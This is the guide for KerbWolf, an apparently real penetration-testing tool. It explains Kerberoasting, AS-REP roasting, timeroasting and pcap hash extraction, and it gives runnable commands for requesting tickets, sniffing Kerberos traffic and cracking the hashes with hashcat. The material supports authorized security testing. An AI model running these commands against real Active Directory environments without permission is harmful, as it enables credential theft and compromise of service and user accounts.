# KerbWolf Guide

## What is Kerberos roasting?

When a user or service authenticates in Active Directory, the KDC hands out encrypted tickets. These tickets are encrypted with a key derived from the account's password. Get your hands on one of those encrypted blobs and you can try to crack the encryption offline by guessing passwords until one produces a key that decrypts correctly. That is roasting.

KerbWolf covers 4 attack types and 7 encryption types (including RFC 8009 AES-SHA2), producing 25 hash formats. hashcat has a mode for all of them except the six AES-SHA2 formats and the 120-byte MS-SNTP format. In addition to Kerberos, it extracts NTLM and MS-SNTP (timeroast) hashes from pcap captures.

The Kerberos authentication flow that we are targeting:

```mermaid
sequenceDiagram
    participant Client
    participant KDC as KDC (Domain Controller)
    participant Service

    rect rgb(40, 40, 60)
    Note over Client,KDC: Step 1 — Get a TGT
    Client->>KDC: AS-REQ (I am admin, here's my encrypted timestamp)
    KDC-->>Client: AS-REP (here's your TGT, encrypted with your key)
    end

    rect rgb(40, 60, 40)
    Note over Client,Service: Step 2 — Get a service ticket
    Client->>KDC: TGS-REQ (I want access to MSSQLSvc/db01, here's my TGT)
    KDC-->>Client: TGS-REP (here's a service ticket, encrypted with the service's key)
    end

    rect rgb(60, 40, 40)
    Note over Client,Service: Step 3 — Access the service
    Client->>Service: AP-REQ (here's my service ticket)
    Service-->>Client: AP-REP (access granted)
    end
```

The three encrypted blobs in this flow (AS-REQ timestamp, AS-REP response, TGS-REP service ticket) can all be extracted and cracked offline.

## Attacks

Three Kerberos attacks, three different message types. Full protocol details and diagrams are on the [Attacks in Depth](attacks.md) page.

### TGS-REP Roast (Kerberoast)

Request a service ticket for any SPN account; the KDC encrypts it with the service's key. Crack it to get the service account's password. Service accounts often have weak passwords and high privileges.

**Tool:** `kw-roast` &nbsp;|&nbsp; **Auth required:** Yes (password, hash, or ccache) &nbsp;|&nbsp; **Exception:** `--no-preauth` needs no auth

### AS-REP Roast

Accounts with `DONT_REQUIRE_PREAUTH` skip pre-authentication. Send an AS-REQ and the KDC gives you an encrypted blob for free (no credentials needed).

**Tool:** `kw-asrep` &nbsp;|&nbsp; **Auth required:** No (LDAP discovery needs auth)

### AS-REQ Pre-Auth

When users authenticate, their AS-REQ contains an encrypted timestamp. Capture it from the network and crack it offline. Completely passive.

**Tool:** `kw-extract` &nbsp;|&nbsp; **Auth required:** No (offline pcap parsing)

`kw-extract` reads the other two Kerberos hash types out of the same capture: the enc-part of every AS-REP (including ordinary pre-authenticated password logons; smartcard and FAST-armored logons are not password-crackable) and the ticket in every TGS-REP. It also extracts NTLM hashes (9 transports: SMB, HTTP, WinRM, LDAP, DCE-RPC, SMTP, POP3, IMAP, Telnet), MS-SNTP timeroast hashes, and plaintext credentials from LDAP simple binds — all in one pass.

### Timeroasting (MS-SNTP)

Domain controllers respond to authenticated NTP requests from computer, gMSA, and trust accounts. The response contains a hash keyed with the account's NT hash. No authentication is needed to request these hashes -- just a valid RID. Machine account passwords are normally long and random, so the attack pays off on the exceptions: pre-created or pre-Windows 2000 computer accounts, manually set passwords, and trust accounts.

**Tool:** `kw-timeroast` &nbsp;|&nbsp; **Auth required:** No &nbsp;|&nbsp; **Two formats:** 68-byte MD5 (hashcat 31300) + 120-byte KDF+HMAC-SHA512

!!! tip "Who owns the key?"
    AS-REQ and AS-REP target the **client's** key (user's password). TGS-REP targets the **service's** key (service account's password). Timeroasting targets **computer/trust account** NT hashes.

## Attack matrix

KerbWolf covers three Kerberos attacks across 7 encryption types, plus timeroasting. See the [Hash Reference](hashcat-modes.md) for the full mode matrix, hash format tables, and cracking examples.

### Timeroasting matrix

| # | Format | Algorithm | Hash format | Hashcat mode |
|---|--------|-----------|-------------|-------------|
| 1 | 68-byte Authenticator | `MD5(NTOWFv1 \|\| salt)` | `$sntp-ms$<hash>$<salt>` | 31300 |
| 2 | 120-byte ExtendedAuthenticator | KDF(SP800-108, HMAC-SHA512) + HMAC-SHA512 | `$sntp-ms-sha512$<RID>$<hash>$<salt>` | none |

---

## Getting started

### Install

```bash
pip install .
# or
uv tool install .
```

You'll need Python 3.11 to 3.14 and system Kerberos libraries (`libkrb5-dev` on Debian, `krb5-devel` on RHEL). See the [installation guide](../getting-started/installation.md) for details.

### Typical workflow

```mermaid
flowchart LR
    A["Get credentials<br/>(password, hash, key)"] --> B["kw-tgt<br/>Request TGT"]
    B --> C["admin.ccache"]
    C --> D["kw-roast --ldap<br/>Kerberoast"]
    C --> E["kw-asrep --ldap<br/>AS-REP Roast"]
    D & E --> F["hashes.txt"]
    F --> G["hashcat<br/>Crack offline"]
    G --> H["Passwords!"]

    Z["Packet capture<br/>(tcpdump, Wireshark)"] --> Y["kw-extract<br/>Parse pcap"]
    Y --> F

    style C fill:#2a2a4a,stroke:#8b8bff
    style F fill:#4a2020,stroke:#ff6b6b
    style H fill:#1a3a1a,stroke:#6bcb77
```

**1. Get a TGT** (if you have credentials):

```bash
kw-tgt -d CORP.LOCAL --dc-ip 10.0.0.1 -u admin -p 'Password1!' -o admin.ccache
```

**2. Kerberoast via LDAP** (auto-discover service accounts):

```bash
kw-roast -k -c admin.ccache --ldap -o hashes.txt
```

Domain and username come from the ccache, so `-d` and `-u` aren't needed. DC is found via DNS SRV. No DNS? Add `--dc-ip`, and give the system Kerberos library a `krb5.conf` for the LDAP bind (see [Kerberos LDAP setup](#kerberos-ldap-setup)).

**3. Crack with hashcat:**

```bash
hashcat -m 13100 hashes.txt wordlist.txt    # RC4
hashcat -m 19700 hashes.txt wordlist.txt    # AES256
```

### No-auth alternatives

**AS-REP Roast**:

```bash
kw-asrep -d CORP.LOCAL --dc-ip 10.0.0.1 -t jsmith -t svc_backup
```

**AS-REQ Pre-Auth**:

```bash
kw-extract capture.pcap -o hashes.txt
tcpdump -i eth0 -w - port 88 | kw-extract -
```

### DC resolution

`kw-roast`, `kw-asrep` and `kw-tgt` resolve the DC through a chain: SRV first, then explicit flags override, then domain A/AAAA as fallback. `kw-timeroast` takes the DC as a positional argument and does no lookup.

```mermaid
flowchart TD
    A["Start: need DC IP + hostname"] --> B{"-k with -c<br/>or KRB5CCNAME?"}
    B -->|Yes| C["Domain and user: -d / -u if given,<br/>otherwise the ccache principal"]
    B -->|No| D["Use -d domain and -u user"]

    C & D --> E["DNS SRV lookup<br/>_kerberos._tcp.DOMAIN"]
    E --> F{"SRV found and<br/>its target resolves?"}
    F -->|Yes| G["dc_ip + dc_hostname from SRV"]
    F -->|No| G2["dc_ip + dc_hostname unset"]

    G & G2 --> H{"--dc-ip given?"}
    H -->|IP address| I["dc_ip = --dc-ip<br/>(overrides SRV)"]
    H -->|Hostname| I2["dc_hostname = --dc-ip<br/>dc_ip = its address,<br/>or the SRV address if it does not resolve"]
    H -->|No| M

    I2 -->|"does not resolve<br/>and no SRV address"| O["Error: cannot resolve"]
    I & I2 --> M{"--dc-hostname given?"}
    M -->|Yes| M2["dc_hostname = --dc-hostname<br/>(always wins)"]
    M -->|No| J
    M2 --> J{"dc_ip set?"}

    J -->|No| K["Resolve domain A/AAAA"]
    J -->|Yes| R
    K -->|Found| R{"dc_hostname set?"}
    K -->|Failed| O2["Error: use --dc-ip"]

    R -->|Yes| P["DC IP + hostname ready"]
    R -->|No| Q["DC IP only<br/>Kerberos LDAP will need<br/>RootDSE lookup for hostname"]

    style P fill:#1a3a1a,stroke:#6bcb77
    style Q fill:#4a4a20,stroke:#ffd93d
    style O fill:#4a2020,stroke:#ff6b6b
    style O2 fill:#4a2020,stroke:#ff6b6b
```

!!! warning "Kerberos LDAP needs a hostname"
    GSSAPI authentication constructs an SPN like `ldap/DC01.corp.local`. If KerbWolf only has a DC IP (no hostname from SRV or `--dc-hostname`), it attempts an anonymous RootDSE lookup to discover the DC's `dnsHostName`, and falls back to the domain name if that fails. If the bind is then refused, pass `--dc-hostname` explicitly.

### Kerberos LDAP setup

When using `-k` for LDAP authentication, you need a working Kerberos environment. The easiest way:

```bash
# Point DNS at the DC (SRV records resolve automatically)
echo "nameserver 10.0.0.1" > /etc/resolv.conf
```

Or generate config files:

```bash
nxc smb 10.0.0.1 --generate-krb5-file /etc/krb5.conf
nxc smb 10.0.0.1 --generate-hosts-file /etc/hosts
```

---

## Deep dives

- [Attacks in Depth](attacks.md) - protocol details, sequence diagrams, ASN.1 paths
- [Encryption Types](encryption-types.md) - key derivation, salt, Windows version history
- [Hash Reference](hashcat-modes.md) - modes, formats, cipher splitting, cracking examples

## Disclaimer

KerbWolf is intended for authorized penetration testing, red team engagements, and security audits only. You must have explicit written permission from the system owner before attacking any Active Directory environment.
